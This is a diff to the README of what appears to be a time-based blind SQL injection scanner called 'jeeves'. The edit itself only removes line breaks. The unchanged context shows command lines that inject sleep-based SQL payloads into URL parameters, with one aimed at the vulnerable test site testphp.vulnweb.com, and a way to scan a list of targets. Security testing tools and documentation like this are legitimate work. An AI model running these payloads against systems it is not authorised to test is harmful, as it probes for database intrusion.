@@ -48,18 +48,14 @@ echo 'https://redacted.com/index.php?id=your_time_based_blind_payload_here' | je
 echo "http://testphp.vulnweb.com/artists.php?artist=" | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves --payload-time 5
 echo "http://testphp.vulnweb.com/artists.php?artist=" | qsreplace "(select(0)from(select(sleep(10)))v)" | jeeves -t 10
 ```
-<br>
 
 In --payload-time you must use the time mentioned in payload
 
 <br>
 
-
 ### From list 
 
 ```cat targets | jeeves --payload-time 5```
- 
-<br>
     
 ### Adding Headers
 
